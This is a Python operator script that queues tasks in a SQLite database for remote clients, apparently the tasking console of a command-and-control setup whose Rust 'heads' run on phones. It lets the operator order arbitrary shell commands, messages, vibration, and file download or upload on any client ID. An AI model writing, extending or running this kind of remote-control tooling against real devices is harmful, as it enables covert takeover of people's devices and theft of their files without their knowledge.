import sqlite3
import json
import sys
import os

DB_PATH = "hydra_heads.db"

def add_task(client_id, action, payload):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    # payload is expected to be a dictionary
    payload_json = json.dumps(payload)
    
    cursor.execute("""
        INSERT INTO tasks (client_id, action, payload, status)
        VALUES (?, ?, ?, 'pending')
    """, (client_id, action, payload_json))
    
    conn.commit()
    conn.close()
    print(f"[+] Task '{action}' added for {client_id}")

def main():
    if len(sys.argv) < 4:
        print("Usage:")
        print("  python commander.py <ID> shell <command>")
        print("  python commander.py <ID> msg <message>")
        print("  python commander.py <ID> vibrate <duration_ms>")
        print("  python commander.py <ID> download <filename>")
        print("  python commander.py <ID> upload <remote_path>")
        return

    client_id = sys.argv[1]
    command_type = sys.argv[2]
    argument = sys.argv[3]

    if command_type == "shell":
        add_task(client_id, "shell", {"cmd": argument})
    elif command_type == "msg":
        add_task(client_id, "msg", {"content": argument})
    elif command_type == "vibrate":
        add_task(client_id, "vibrate", {"duration": int(argument)})
    elif command_type == "download":
        # The Rust head expects {"filename": "..."}
        add_task(client_id, "download", {"filename": argument})
    elif command_type == "upload":
        # The Rust head expects {"path": "..."}
        add_task(client_id, "upload", {"path": argument})
    else:
        print(f"[!] Unknown command type: {command_type}")

if __name__ == "__main__":
    main()